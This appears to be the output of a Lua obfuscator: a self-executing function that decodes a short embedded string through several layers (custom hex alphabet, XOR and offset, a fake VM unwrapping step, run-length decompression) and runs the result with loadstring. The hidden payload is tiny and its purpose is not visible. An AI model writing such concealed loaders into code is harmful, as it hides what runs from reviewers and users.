return(function()
local vzvjzopvfi="cbed9f6fa27519fcbc0461982a83461aeb9d3f597215d9560c6451fa8af3c6729b3daf5812d5b9cd6c542141fa43e6d83bad7fb2d2b50980"
local vylndmifut="c49ea317bd6025f8"
local vvsbfeovvu={}
for vkcscpjhvt=1,#vzvjzopvfi,2 do
if vkcscpjhvt%2==0 then
local vdthhsqfyd=string.find(vylndmifut,vzvjzopvfi:sub(vkcscpjhvt,vkcscpjhvt),1,true)-1
local vsrldfaaqv=string.find(vylndmifut,vzvjzopvfi:sub(vkcscpjhvt+1,vkcscpjhvt+1),1,true)-1
table.insert(vvsbfeovvu,string.char(vdthhsqfyd*16+vsrldfaaqv))
else
local vdthhsqfyd=string.find(vylndmifut,vzvjzopvfi:sub(vkcscpjhvt,vkcscpjhvt),1,true)-1
local vsrldfaaqv=string.find(vylndmifut,vzvjzopvfi:sub(vkcscpjhvt+1,vkcscpjhvt+1),1,true)-1
table.insert(vvsbfeovvu,string.char(vdthhsqfyd*16+vsrldfaaqv))
end
end
local vtaxqvalzk=table.concat(vvsbfeovvu)
local vdinyadgpc={}
for vkcscpjhvt=1,#vtaxqvalzk do
local veqfrhqfnd=vtaxqvalzk:byte(vkcscpjhvt)
local vtydteclxq=bit32.bxor(veqfrhqfnd,26)
local veixlkenrl=vtydteclxq-((vkcscpjhvt*17)%256)
table.insert(vdinyadgpc,string.char(veixlkenrl%256))
end
vtaxqvalzk=table.concat(vdinyadgpc)
local vdinyadgpc={}
local vkcscpjhvt=1
while vkcscpjhvt<=#vtaxqvalzk do
local veixlkenrl=vtaxqvalzk:byte(vkcscpjhvt)
if veixlkenrl==1 then
table.insert(vdinyadgpc,string.char(vtaxqvalzk:byte(vkcscpjhvt+1)))
vkcscpjhvt=vkcscpjhvt+2
else error('Invalid VM instruction') end
end
vtaxqvalzk=table.concat(vdinyadgpc)
local vdinyadgpc={}
for vkcscpjhvt=1,#vtaxqvalzk,2 do
local veixlkenrl=vtaxqvalzk:byte(vkcscpjhvt)
local vtydteclxq=vtaxqvalzk:byte(vkcscpjhvt+1)
if not veixlkenrl or not vtydteclxq then error('Invalid compressed data') end
table.insert(vdinyadgpc,string.rep(string.char(vtydteclxq),veixlkenrl))
end
vtaxqvalzk=table.concat(vdinyadgpc)
local vdinyadgpc=loadstring or load
if not vdinyadgpc then error('Dynamic compilation unavailable') end
local veixlkenrl=vdinyadgpc(vtaxqvalzk)
if not veixlkenrl then error('Compilation failed') end
return veixlkenrl()
end)()